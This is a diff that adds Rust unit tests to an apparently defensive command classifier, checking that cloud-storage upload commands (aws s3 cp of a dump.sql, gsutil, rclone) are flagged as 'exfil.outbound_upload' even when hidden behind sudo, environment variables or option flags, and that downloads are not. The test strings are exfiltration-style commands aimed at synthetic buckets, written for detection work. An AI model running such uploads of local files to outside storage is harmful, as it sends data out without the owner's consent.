@@ -989,6 +989,46 @@ fn a_backgrounded_command_does_not_hide_a_later_upload_in_either_view() {
     }
 }
 
+/// The action view reads a storage client after wrappers, assignments, a
+/// `.exe` suffix, global options and option clusters, as the HTTP reader does.
+#[test]
+fn object_storage_uploads_behind_wrappers_and_options_match_in_the_action_view() {
+    for command in [
+        "sudo aws s3 cp dump.sql s3://synthetic-bucket/",
+        "AWS_PROFILE=fixture aws s3 cp f s3://synthetic-bucket/",
+        "aws.exe s3 cp f s3://synthetic-bucket/",
+        "aws --profile fixture s3 cp f s3://synthetic-bucket/",
+        "gsutil -m cp -r ./dist gs://synthetic-bucket/",
+        "rclone.exe copy ./d synthetic-remote:b",
+    ] {
+        assert!(
+            session_and_action_match(command, "exfil.outbound_upload").1,
+            "{command}"
+        );
+    }
+}
+
+/// Value-taking options and progress flags before a remote source, help and a
+/// copy outside the `s3` command group are not uploads.
+#[test]
+fn object_storage_reads_with_options_before_the_source_do_not_match_in_the_action_view() {
+    for command in [
+        "rclone copy -P synthetic-remote:src ./local",
+        "rclone copy -v synthetic-remote:src ./local",
+        "rclone copy --progress synthetic-remote:src ./local",
+        "aws s3 cp --profile prod s3://synthetic-bucket/a ./a",
+        "aws s3 cp --region us-east-1 s3://synthetic-bucket/a ./a",
+        "aws s3 cp help",
+        "aws cp x y",
+        "az storage copy --source-account-name acct --source-container c --destination ./dl",
+    ] {
+        assert!(
+            !session_and_action_match(command, "exfil.outbound_upload").1,
+            "{command}"
+        );
+    }
+}
+
 #[test]
 fn decode_only_shell_call_keeps_shell_credit_and_a_zero_point_hunt() {
     let output = actions(&[parsed_shell_call(
